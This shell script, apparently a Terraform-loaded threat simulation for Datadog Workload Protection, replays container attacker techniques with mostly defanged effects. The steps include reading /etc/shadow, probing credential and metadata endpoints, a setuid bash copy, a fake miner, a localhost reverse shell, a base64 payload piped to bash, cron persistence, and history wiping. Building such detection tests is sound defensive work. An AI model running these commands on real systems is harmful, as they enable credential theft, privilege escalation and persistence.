# Harmless replay of common container attacker techniques, for Datadog Workload Protection.
# Runs only when var.datadog.threat_simulation is true. Prints labels only, never secrets.
# Loaded with Terraform file() (no interpolation), so shell ${...} is passed through as-is.
set +e
echo "[threat-sim] package manager in container"
dnf install -y -q procps-ng >/dev/null 2>&1
while true; do
  echo "[threat-sim] discovery: id, uname, ps, /etc/passwd"
  id; uname -a; ps aux >/dev/null 2>&1; cat /etc/passwd >/dev/null
  echo "[threat-sim] credential access: read /etc/shadow"
  cat /etc/shadow >/dev/null 2>&1
  echo "[threat-sim] container credential endpoint (output discarded)"
  curl -s -o /dev/null -m 3 "http://169.254.170.2${AWS_CONTAINER_CREDENTIALS_RELATIVE_URI}"
  echo "[threat-sim] cloud metadata probe"
  curl -s -o /dev/null -m 2 http://169.254.169.254/latest/meta-data/
  echo "[threat-sim] setuid copy of bash in /tmp"
  cp /bin/bash /tmp/.sysd; chmod u+s /tmp/.sysd
  echo "[threat-sim] crypto miner lookalike (renamed sleep)"
  cp /bin/sleep /tmp/xmrig; /tmp/xmrig 1 -o stratum+tcp://pool.minexmr.invalid:4444 --donate-level 1 >/dev/null 2>&1
  echo "[threat-sim] reverse shell attempt to localhost (fails)"
  timeout 2 bash -c 'bash -i >& /dev/tcp/127.0.0.1/4444 0>&1' >/dev/null 2>&1
  echo "[threat-sim] base64-encoded payload piped to shell"
  echo 'aWQgPi9kZXYvbnVsbAo=' | base64 -d | bash
  echo "[threat-sim] persistence via cron.d"
  mkdir -p /etc/cron.d; echo '* * * * * root /tmp/.sysd -p' > /etc/cron.d/sysd
  echo "[threat-sim] defense evasion: history wipe, timestomp"
  rm -f /root/.bash_history; touch -d '2001-01-01' /tmp/.sysd
  echo "[threat-sim] cleanup"
  rm -f /tmp/xmrig /tmp/.sysd /etc/cron.d/sysd
  sleep 900
done
